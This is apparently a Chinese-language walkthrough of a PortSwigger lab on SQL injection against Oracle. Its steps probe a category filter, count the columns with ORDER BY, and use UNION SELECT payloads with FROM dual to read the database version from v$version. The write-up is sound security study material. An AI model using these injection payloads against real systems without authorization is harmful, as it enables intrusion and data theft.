# 实验：SQL 注入攻击，在 Oracle 上查询数据库类型和版本

本实验在产品类别过滤器中包含一个 SQL 注入漏洞。你可以使用 UNION 攻击从注入的查询中检索结果。

为了解决本实验，请显示数据库版本字符串。

> **提示**
> 在 Oracle 数据库中，每个 `SELECT` 语句必须指定一个要从中选择的表（`FROM`）。如果你的 `UNION SELECT` 攻击不从表中查询，你仍然需要包含 `FROM` 关键字后跟一个有效的表名。
>
> Oracle 中有一个名为 `dual` 的内置表，你可以用于此目的。例如：`UNION SELECT 'abc' FROM dual`
>
> 欲了解更多信息，请参阅我们的 [SQL 注入速查表](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

## 步骤

探测
- 使用类别过滤器
    ```http
    GET /filter?category=Pets HTTP/2
    ```

- 检测单引号与成对双引号
    - 观察到典型的单个单引号报错，两个双引号正常的行为

测试
- 尝试使用干净载荷
    ```sql
    $category='notexist'--
    ```
- 为之后使用联合查询，当前使用 order by 确认列数
    - 当2正常，而3异常时。确认原查询的列数为2

- 尝试 `UNION SELECT NULL,NULL`
    - 报错
    - 此时列数正确，报错应当为 Oracle 数据库的 SELECT 特性。同时确认数据库类型

- 尝试添加 FROM dual
    ```sql
    $category='notexist' UNION SELECT NULL,NULL FROM DUAL --
    ```
    - 成功

- 测试第一列的类型，使用字符串
    - 第一列为字符串型

- 尝试获取 Oracle 数据库的版本，查询版本表，在字符串型的第一列中查询版本字段
    ```sql
    UNION SELECT BANNER,NULL FROM v$version --
    ```
